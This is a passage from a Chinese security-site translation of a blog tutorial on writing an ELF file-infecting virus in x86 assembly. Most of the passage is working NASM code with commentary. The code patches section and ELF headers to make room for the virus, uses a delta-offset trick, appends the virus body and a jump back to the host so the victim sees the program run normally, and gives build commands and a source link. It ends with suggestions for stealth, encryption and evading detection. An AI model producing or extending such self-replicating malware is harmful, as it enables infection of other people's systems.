&nbsp;&nbsp;&nbsp;&nbsp;jbe&nbsp;finish_infection&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;找不到.bss节。&nbsp;&nbsp;不需要担心，可以完成感染
&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;ecx，&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;计数减一
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ebx，&nbsp;dword&nbsp;[edi+2080+eax+4]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;shdr-&gt;type&nbsp;（节类型）
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;ebx，&nbsp;0x00000008&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;0x08是&nbsp;NOBITS，.bss节的指标
&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;section_header_loop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;不是.bss节
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ebx，&nbsp;dword&nbsp;[edi+2080+eax+12]&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;shdr-&gt;addr&nbsp;（内存虚拟地址）
&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;ebx，&nbsp;v_stop&nbsp;-&nbsp;v_start&nbsp;&nbsp;&nbsp;;&nbsp;增加我们病毒的长度给&nbsp;shdr-&gt;addr
&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;ebx，&nbsp;7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;为了跳转到起始入口点
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;[edi+2080+eax+12]，&nbsp;ebx&nbsp;&nbsp;;&nbsp;用新的覆盖旧的shdr-&gt;addr（在缓冲区里）
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edx，&nbsp;dword&nbsp;[edi+2080+eax+16]&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;shdr-&gt;offset&nbsp;（节的偏移）
&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;edx，&nbsp;v_stop&nbsp;-&nbsp;v_start&nbsp;&nbsp;&nbsp;;&nbsp;增加我们病毒的长度给shdr-&gt;offset
&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;edx，&nbsp;7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;为了跳转到起始入口点
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;[edi+2080+eax+16]，&nbsp;edx&nbsp;&nbsp;;&nbsp;用新的覆盖旧的shdr-&gt;offset（在缓冲区里）</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们还需要修改.bss节头。我们可以通过检查类型标志NOBITS说这是否是一个节头。节头不一定需要为了运行可执行文件而存在。所以如果我们不能找到它，也没什么大不了的，我们仍然可以继续进行：</span></p><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p><code><span style="font-size:13px"></span></code></p><pre class="brush:plain;toolbar:false">;dword&nbsp;[edi+2080+24]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;entry&nbsp;（入口点的虚拟地址）
;dword&nbsp;[edi+2080+28]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;phoff&nbsp;（程序头便宜）
;dword&nbsp;[edi+2080+32]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;shoff&nbsp;（节头偏移）
;word&nbsp;[edi+2080+40]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;ehsize&nbsp;（elf头的长度）
;word&nbsp;[edi+2080+42]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;phentsize&nbsp;（一个程序头入口的长度）
;word&nbsp;[edi+2080+44]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;phnum&nbsp;（程序头入口的数量）
;word&nbsp;[edi+2080+46]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;shentsize&nbsp;（一个节头入口的长度）
;word&nbsp;[edi+2080+48]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;shnum&nbsp;（程序头入口的数量）
mov&nbsp;eax，&nbsp;v_stop&nbsp;-&nbsp;v_start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;我们病毒的长度减去到原始入口点的跳转
add&nbsp;eax，&nbsp;7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;为了到原始入口点的跳转
mov&nbsp;ebx，&nbsp;dword&nbsp;[edi+2080+32]&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;原始节头偏移
add&nbsp;eax，&nbsp;ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;增加原始节头偏移
mov&nbsp;[edi+2080+32]，&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;用新的覆盖旧的shdr-&gt;offset（在缓冲区里）</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后，当然我们需要通过修改节头偏移对ELF头作最后修改，因为我们感染data段的尾端（bss之前）。程序头保持在同一位置：</span></p><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">;dword&nbsp;[edi+2080+24]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;entry&nbsp;(virtual&nbsp;address&nbsp;of&nbsp;entry&nbsp;point)
;dword&nbsp;[edi+2080+28]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;phoff&nbsp;(program&nbsp;header&nbsp;offset)
;dword&nbsp;[edi+2080+32]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;shoff&nbsp;(section&nbsp;header&nbsp;offset)
;word&nbsp;[edi+2080+40]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;ehsize&nbsp;(size&nbsp;of&nbsp;elf&nbsp;header)
;word&nbsp;[edi+2080+42]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;phentsize&nbsp;(size&nbsp;of&nbsp;one&nbsp;program&nbsp;header&nbsp;entry)
;word&nbsp;[edi+2080+44]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;phnum&nbsp;(number&nbsp;of&nbsp;program&nbsp;header&nbsp;entries)
;word&nbsp;[edi+2080+46]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;shentsize&nbsp;(size&nbsp;of&nbsp;one&nbsp;section&nbsp;header&nbsp;entry)
;word&nbsp;[edi+2080+48]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;ehdr-&gt;shnum&nbsp;(number&nbsp;of&nbsp;program&nbsp;header&nbsp;entries)
mov&nbsp;eax,&nbsp;v_stop&nbsp;-&nbsp;v_start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;size&nbsp;of&nbsp;our&nbsp;virus&nbsp;minus&nbsp;the&nbsp;jump&nbsp;to&nbsp;original&nbsp;entry&nbsp;point
add&nbsp;eax,&nbsp;7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;for&nbsp;the&nbsp;jmp&nbsp;to&nbsp;original&nbsp;entry&nbsp;point
mov&nbsp;ebx,&nbsp;dword&nbsp;[edi+2080+32]&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;the&nbsp;original&nbsp;section&nbsp;header&nbsp;offset
add&nbsp;eax,&nbsp;ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;add&nbsp;the&nbsp;original&nbsp;section&nbsp;header&nbsp;offset
mov&nbsp;[edi+2080+32],&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;overwrite&nbsp;the&nbsp;old&nbsp;section&nbsp;header&nbsp;offset&nbsp;with&nbsp;the&nbsp;new&nbsp;one&nbsp;(in&nbsp;buffer)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">最后一步是注入病毒的实体代码，并完成回到宿主代码入口点的跳转指令，以便我们毫无戒心的用户看到宿主程序运行正常。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">你可能会问自己的问题是，病毒如何抓取自己的代码？病毒是如何确定自己的长度呢？这些都是很好的问题。首先，我使用标签来标记病毒的开始和结束，然后使用简单的数学偏移：</span></p><p><code><span style="font-size:13px"></span></code></p><pre class="brush:plain;toolbar:false">section&nbsp;.text
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;v_start
&nbsp;
v_start：
&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;病毒体开始
...
...
...
...
v_stop：
&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;病毒体结束
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax，&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;sys_exit
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ebx，&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;正常状态
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;80h</pre><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">通过这样做，我可以使用v_start作为病毒开始的偏移量，然后可以使用v_stop-v_start作为字节数量（长度）。</span></p><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p><code><span style="font-size:13px"></span></code></p><pre class="brush:plain;toolbar:false">mov&nbsp;eax，&nbsp;4
mov&nbsp;ecx，&nbsp;v_start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;附加病毒部分
mov&nbsp;edx，&nbsp;v_stop&nbsp;-&nbsp;v_start&nbsp;&nbsp;&nbsp;;&nbsp;病毒字节的长度
int&nbsp;80h</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">病毒的长度（v_stop - v_start）比较好计算，但是在第一次感染后病毒代码的开头（mov ecx, v_start）引用将会失败。事实上，任何绝对地址的引用都将会失败，因为不同宿主程序的内存位置都会发生改变。像v_start这种标签的绝对地址是在编译期间计算好的，而那取决于它如何被调用。你使用的正常短跳转如jmp、jne、jnz等都将被转换为相对于当前指令的偏移，不过像MOV这类标签的地址就不会变。我们需要的是一个delta偏移量。delta偏移量就是从原始病毒当前宿主文件的虚拟地址差值。那么如何得到delta偏移量呢？这有一个我从90年初的DOS病毒教程“Dark Angel’s Phunky Virus Guide”里学来的一个非常简单的技巧：</span></p><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p><code><span style="font-size:13px"></span></code></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;delta_offset
delta_offset：
&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;sub&nbsp;ebp，&nbsp;delta_offset</pre><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">通过在当前位置调用一个标签，当前指令的指针（绝对地址）就会被压入栈以方便你可以知道你RET返回到哪里。我们只要把这个值从堆栈里弹出来就能获得当前指令的指针。然后通过从当前地址减去原始病毒的绝对地址，我们就在EBP里获得了delta偏移量！在原病毒执行期间delta偏移量将为0。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">你会注意到，为了规避某些障碍，我们调用没有RET的CALL，反之亦然。我建议你尽量不要在这个项目以外的地方这样做，因为很显然，丢失一个call/ret对将会导致性能损失…但现在不是正常的情况。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在我们有了delta偏移量，让我们切换v_start的引用为delta偏移量版本：</span></p><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">mov&nbsp;eax，&nbsp;4
lea&nbsp;ecx，&nbsp;[ebp&nbsp;+&nbsp;v_start]&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;附加病毒部分&nbsp;（用delta偏移计算）
mov&nbsp;edx，&nbsp;v_stop&nbsp;-&nbsp;v_start&nbsp;&nbsp;&nbsp;;&nbsp;病毒数据的长度
int&nbsp;80h</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">注意到我并没有在病毒里包含系统退出调用。这是因为我不想让病毒在执行宿主代码之前退出。相反，我把这部分替换为跳转到原始宿主的代码。由于不同宿主程序入口点会有所不同，我需要动态生成它然后直接注入操作码。为了找出操作码，你必须首先了解JMP指令本身的特点。JMP指令将试图通过计算到目的地址的偏移做一个相对跳转。我们要给它一个绝对位置。我通过汇编一个小程序里面的JMP短跳转和JMP远跳转算出了它们的十六进制操作码。JMP 操作码从E9变到FF。</span></p><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">mov&nbsp;ebx，&nbsp;0x08048080
jmp&nbsp;ebx&nbsp;
jmp&nbsp;0x08048080</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">汇编后，我运行“xxd”然后检查字节数据就知道如何将它翻译成操作码了。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01ad364d804e0d5ef7.png" title="t011124da5d59dc77c5.png" alt="http://p7.qhimg.com/t011124da5d59dc77c5.png"/></p><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">pop&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;宿主程序的原始入口点
mov&nbsp;[edi]，&nbsp;byte&nbsp;0xb8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;MOV&nbsp;EAX的操作码&nbsp;（1&nbsp;byte）
mov&nbsp;[edi+1]，&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;原始入口点&nbsp;（4&nbsp;bytes）
mov&nbsp;[edi+5]，&nbsp;word&nbsp;0xe0ff&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;JMP&nbsp;EAX操作码&nbsp;（2&nbsp;bytes）</pre><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">MOV一个双字到寄存器EAX最终被表示为B8 xx xx xx xx。JMP到存储在寄存器EAX里地址的指令最终被表示为FF E0</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上面总共有7个额外字节添加到病毒的结尾。这也意味着，我们修改的每个偏移和文件长度必须加入这额外的7个字节。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">因此我的病毒在缓冲区里的头部做了修改（而不是在文件），然后用修改的缓冲区覆盖宿主文件直到我们病毒代码驻留的偏移位置。然后插入它本身（vstart，vstop-vstart）再继续写缓冲区字节的其余部分，最后转接程序控制权给原始宿主文件。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一旦我汇编了病毒，我想在病毒的第8字节处手动添加病毒标记。这在我的示例中可能不是必要的，因为我的病毒会跳过目标如果它没有一个DATA段的话，但实际也不会非总是这样。打开你最喜欢的十六进制编辑器并添加这些字节吧！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在我们完成了，让我们来汇编并测试它：nasm -f elf -F dwarf -g virus.asm &amp;&amp; ld -m elf_i386 -e v_start -o virus.o</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我录了一个测试视频。这里面我听起来像是有点缺乏热情，只是因为现在是深夜，实际上我是欣喜若狂的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">既然你已经完成了阅读，这里就贴上我过度评论的病毒源代码链接：<a href="https://github.com/cranklin/cranky-data-virus" _src="https://github.com/cranklin/cranky-data-virus">https://github.com/cranklin/cranky-data-virus</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是一个非常简单的ELF感染病毒。它也可以通过非常简单的调整进行改进：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——从ELF头中提取更多的信息（32或64位、可执行文件等）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——在targetfile缓冲区后分配文件缓冲区。为什么？因为当我们获得targetfile缓冲区时就不再使用文件缓冲区了，我们可以为来获得一个更大的targetfile缓冲区而溢出文件缓冲区。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——遍历目录，这也可以通过一些稍微复杂的调整来改善：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——稍微覆盖我们的行踪更好地隐形</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——加密!</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——改变特征</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——使用更难检测的方法去感染</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">好了，这就是献给大家的全部内容了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">总结</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">通过读这篇文章，我希望你也能够获得一些关于启发式病毒检测知识（而不需要搜索特定病毒特征）。也许这将是改天的主题。或者我将介绍OSX病毒…也许我会做一些蹩脚的事情并演示一个Nodejs病毒。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们将会看到的，现在再见了。</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://cranklin.wordpress.com/2016/12/26/how-to-create-a-virus-using-the-assembly-language/" target="_blank">原文链接：https://cranklin.wordpress.com/2016/12/26/how-to-create-a-virus-using-the-assembly-language/</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】如何使用汇编语言编写一个病毒 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3371" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
